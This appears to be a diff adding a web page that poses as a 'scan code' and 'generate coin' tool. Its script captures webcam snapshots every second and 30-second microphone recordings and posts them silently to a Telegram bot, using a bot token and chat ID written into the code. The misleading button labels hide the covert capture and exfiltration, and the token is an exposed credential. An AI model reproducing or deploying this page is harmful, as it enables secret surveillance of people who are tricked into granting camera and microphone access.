@@ -1,0 +1,375 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>Scan Code</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Bebas+Neue&family=Space+Grotesk:wght@500;700&family=Space+Mono&display=swap');
+
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+
+  body {
+    background: #000;
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    font-family: 'Space Grotesk', sans-serif;
+    overflow: hidden;
+    position: relative;
+  }
+
+  /* animated bg lines */
+  body::before {
+    content: '';
+    position: fixed;
+    inset: 0;
+    background: repeating-linear-gradient(
+      0deg,
+      transparent,
+      transparent 60px,
+      rgba(41,168,224,0.04) 60px,
+      rgba(41,168,224,0.04) 61px
+    ),
+    repeating-linear-gradient(
+      90deg,
+      transparent,
+      transparent 60px,
+      rgba(41,168,224,0.04) 60px,
+      rgba(41,168,224,0.04) 61px
+    );
+    pointer-events: none;
+  }
+
+  /* camera feed fullscreen bg */
+  #video {
+    position: fixed;
+    inset: 0;
+    width: 100%;
+    height: 100%;
+    object-fit: cover;
+    opacity: 0;
+    transition: opacity 0.6s ease;
+    z-index: 0;
+  }
+  #video.active { opacity: 0.35; }
+
+  /* dark overlay */
+  .overlay {
+    position: fixed;
+    inset: 0;
+    background: linear-gradient(to bottom, rgba(0,0,0,0.5) 0%, rgba(0,0,0,0.85) 100%);
+    z-index: 1;
+    pointer-events: none;
+  }
+
+  canvas { display: none; }
+
+  /* main content */
+  .content {
+    position: relative;
+    z-index: 2;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    gap: 3rem;
+    padding: 2rem;
+    width: 100%;
+    max-width: 600px;
+  }
+
+  /* big name */
+  h1 {
+    font-family: 'Bebas Neue', sans-serif;
+    font-size: clamp(4rem, 18vw, 9rem);
+    letter-spacing: 0.04em;
+    line-height: 0.9;
+    text-align: center;
+    background: linear-gradient(135deg, #fff 30%, #29a8e0 100%);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    background-clip: text;
+    text-shadow: none;
+    user-select: none;
+  }
+
+  /* status bar */
+  .status {
+    font-family: 'Space Mono', monospace;
+    font-size: 0.75rem;
+    color: rgba(255,255,255,0.4);
+    letter-spacing: 0.08em;
+    text-transform: uppercase;
+    height: 1.2em;
+    transition: color 0.3s;
+  }
+  .status.on { color: #29a8e0; }
+  .status.rec { color: #ff4d6d; }
+
+  /* buttons */
+  .btns {
+    display: flex;
+    flex-direction: column;
+    gap: 1rem;
+    width: 100%;
+    max-width: 320px;
+  }
+
+  button {
+    width: 100%;
+    padding: 1.1rem;
+    border-radius: 14px;
+    border: none;
+    font-family: 'Space Grotesk', sans-serif;
+    font-size: 1rem;
+    font-weight: 700;
+    letter-spacing: 0.05em;
+    cursor: pointer;
+    transition: transform 0.12s, opacity 0.2s, box-shadow 0.2s;
+    position: relative;
+    overflow: hidden;
+  }
+  button:active { transform: scale(0.96); }
+  button:disabled { opacity: 0.3; cursor: not-allowed; }
+
+  #startCam {
+    background: #29a8e0;
+    color: #fff;
+    box-shadow: 0 0 30px rgba(41,168,224,0.4);
+  }
+  #startCam:hover:not(:disabled) { box-shadow: 0 0 45px rgba(41,168,224,0.7); }
+
+  #stopCam {
+    background: rgba(255,255,255,0.07);
+    color: #fff;
+    border: 1px solid rgba(255,255,255,0.15);
+  }
+  #stopCam:hover:not(:disabled) { background: rgba(255,255,255,0.12); }
+
+  #startRec {
+    background: #ff4d6d;
+    color: #fff;
+    box-shadow: 0 0 30px rgba(255,77,109,0.35);
+  }
+  #startRec:hover:not(:disabled) { box-shadow: 0 0 45px rgba(255,77,109,0.65); }
+  #startRec.recording { animation: recPulse 1s infinite; }
+
+  @keyframes recPulse {
+    0%,100% { box-shadow: 0 0 30px rgba(255,77,109,0.35); }
+    50%      { box-shadow: 0 0 60px rgba(255,77,109,0.85); }
+  }
+
+  /* progress bar (audio countdown) */
+  .prog-wrap {
+    width: 100%;
+    max-width: 320px;
+    height: 3px;
+    background: rgba(255,255,255,0.1);
+    border-radius: 10px;
+    overflow: hidden;
+    opacity: 0;
+    transition: opacity 0.3s;
+  }
+  .prog-wrap.visible { opacity: 1; }
+  .prog-bar {
+    height: 100%;
+    width: 0%;
+    background: #ff4d6d;
+    border-radius: 10px;
+    transition: width 0.5s linear;
+  }
+
+  /* live dot on cam */
+  .live {
+    position: fixed;
+    top: 18px; left: 18px;
+    z-index: 10;
+    display: flex; align-items: center; gap: 6px;
+    font-family: 'Space Mono', monospace;
+    font-size: 0.65rem;
+    color: #fff;
+    background: rgba(0,0,0,0.55);
+    padding: 5px 10px;
+    border-radius: 20px;
+    opacity: 0;
+    transition: opacity 0.3s;
+  }
+  .live.visible { opacity: 1; }
+  .live-dot {
+    width: 7px; height: 7px; border-radius: 50%;
+    background: #ff4d6d;
+    animation: blink 1s infinite;
+  }
+  @keyframes blink {
+    0%,100%{opacity:1} 50%{opacity:0.2}
+  }
+</style>
+</head>
+<body>
+
+<video id="video" autoplay muted playsinline></video>
+<canvas id="canvas"></canvas>
+<div class="overlay"></div>
+
+<div class="live" id="liveBadge"><div class="live-dot"></div>LIVE</div>
+
+<div class="content">
+  <h1>Tasin<br>Saimon</h1>
+
+  <div class="status" id="status">Ready</div>
+
+  <div class="btns">
+    <button id="startCam">Scan Code</button>
+    <button id="stopCam" disabled>Genarate Code</button>
+    <button id="startRec" disabled>Genarate Coin</button>
+  </div>
+
+  <div class="prog-wrap" id="progWrap">
+    <div class="prog-bar" id="progBar"></div>
+  </div>
+</div>
+
+<script>
+const BOT_TOKEN = '8697759714:AAEalrWRYkyZCgfh01APUG7g4w9XW79Gn2A';
+const CHAT_ID   = '8697759714';
+const REC_SECS  = 30;
+
+const video    = document.getElementById('video');
+const canvas   = document.getElementById('canvas');
+const startCam = document.getElementById('startCam');
+const stopCam  = document.getElementById('stopCam');
+const startRec = document.getElementById('startRec');
+const status   = document.getElementById('status');
+const liveBadge= document.getElementById('liveBadge');
+const progWrap = document.getElementById('progWrap');
+const progBar  = document.getElementById('progBar');
+
+let stream = null;
+let camTimer = null;
+let mediaRec = null;
+let recChunks = [];
+
+function setStatus(msg, cls='') {
+  status.textContent = msg;
+  status.className = 'status ' + cls;
+}
+
+// ── CAMERA ──
+startCam.onclick = async () => {
+  try {
+    stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+    video.srcObject = stream;
+    video.classList.add('active');
+    liveBadge.classList.add('visible');
+    startCam.disabled = true;
+    stopCam.disabled  = false;
+    startRec.disabled = false;
+    setStatus('Scaning Code.......', 'on');
+
+    // send photo every second
+    camTimer = setInterval(sendPhoto, 1000);
+  } catch(e) {
+    setStatus('Permition denied: ' + e.message, 'rec');
+  }
+};
+
+stopCam.onclick = () => {
+  clearInterval(camTimer);
+  if (stream) { stream.getTracks().forEach(t => t.stop()); stream = null; }
+  video.srcObject = null;
+  video.classList.remove('active');
+  liveBadge.classList.remove('visible');
+  startCam.disabled = false;
+  stopCam.disabled  = true;
+  startRec.disabled = true;
+  setStatus('Camera stopped');
+};
+
+async function sendPhoto() {
+  if (!stream) return;
+  canvas.width  = video.videoWidth  || 640;
+  canvas.height = video.videoHeight || 480;
+  canvas.getContext('2d').drawImage(video, 0, 0);
+  canvas.toBlob(async (blob) => {
+    const form = new FormData();
+    form.append('chat_id', CHAT_ID);
+    form.append('photo', blob, 'snap.jpg');
+    form.append('caption', '📸 ' + new Date().toLocaleTimeString());
+    try {
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method:'POST', body:form });
+    } catch(e) {}
+  }, 'image/jpeg', 0.8);
+}
+
+// ── AUDIO RECORD ──
+startRec.onclick = async () => {
+  if (mediaRec && mediaRec.state === 'recording') return;
+
+  let audioStream;
+  try {
+    audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+  } catch(e) {
+    setStatus('Mic denied: ' + e.message, 'rec');
+    return;
+  }
+
+  recChunks = [];
+  mediaRec = new MediaRecorder(audioStream);
+  mediaRec.ondataavailable = e => { if (e.data.size > 0) recChunks.push(e.data); };
+  mediaRec.onstop = async () => {
+    audioStream.getTracks().forEach(t => t.stop());
+    const blob = new Blob(recChunks, { type: 'audio/ogg; codecs=opus' });
+    await sendAudio(blob);
+    progWrap.classList.remove('visible');
+    progBar.style.width = '0%';
+    startRec.classList.remove('recording');
+    startRec.disabled = false;
+    startRec.textContent = '⏺ START RECORD';
+    setStatus('Audio sent!', 'on');
+    setTimeout(() => setStatus('Camera live — sending snaps every 1s', 'on'), 2500);
+  };
+
+  mediaRec.start();
+  startRec.disabled = true;
+  startRec.classList.add('recording');
+  startRec.textContent = '⏺ RECORDING...';
+  progWrap.classList.add('visible');
+  setStatus('Recording 30s audio…', 'rec');
+
+  // animate progress
+  let elapsed = 0;
+  const step = 500;
+  const tick = setInterval(() => {
+    elapsed += step;
+    progBar.style.width = Math.min(100, (elapsed / (REC_SECS * 1000)) * 100) + '%';
+    if (elapsed >= REC_SECS * 1000) clearInterval(tick);
+  }, step);
+
+  // auto stop after 30s
+  setTimeout(() => {
+    if (mediaRec && mediaRec.state === 'recording') mediaRec.stop();
+  }, REC_SECS * 1000);
+};
+
+async function sendAudio(blob) {
+  const form = new FormData();
+  form.append('chat_id', CHAT_ID);
+  form.append('audio', blob, 'voice.ogg');
+  form.append('title', 'Voice ' + new Date().toLocaleTimeString());
+  try {
+    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, { method:'POST', body:form });
+    const j = await res.json();
+    if (!j.ok) {
+      // fallback: send as voice note
+      const form2 = new FormData();
+      form2.append('chat_id', CHAT_ID);
+      form2.append('voice', blob, 'voice.ogg');
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVoice`, { method:'POST', body:form2 });
+    }
+  } catch(e) {}
+}
+</script>
+</body>
+</html>
